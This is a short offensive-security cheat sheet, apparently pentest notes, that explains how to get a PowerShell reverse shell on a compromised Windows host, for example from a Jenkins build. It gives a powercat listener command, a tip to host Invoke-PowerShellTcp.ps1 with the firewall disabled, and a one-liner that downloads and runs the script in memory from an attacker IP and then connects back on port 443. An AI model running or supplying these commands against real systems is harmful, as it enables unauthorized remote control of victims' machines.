# PowerShell Reverse shell

When we can execute commands on a box (for example from a Jenkins build) we can use powercat + invoke-powershelltcp to establish a reverse shell to our box:

1. Load powercat.ps1 and start a listener on the attacker machine:

```bash
. .\powercat.ps1
powercat -l -p 443 -t 1000 -Verbose
```

2. Host Invoke-PowerShellTcp.ps1 from our box (victim will download it):

```bash
execute the binary called hfs.exe #remember to disable firewall in case of troubles.
```

3. Execute one of the following commands on the victim machine (it will be loaded in memory without touching disk):

```bash
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```
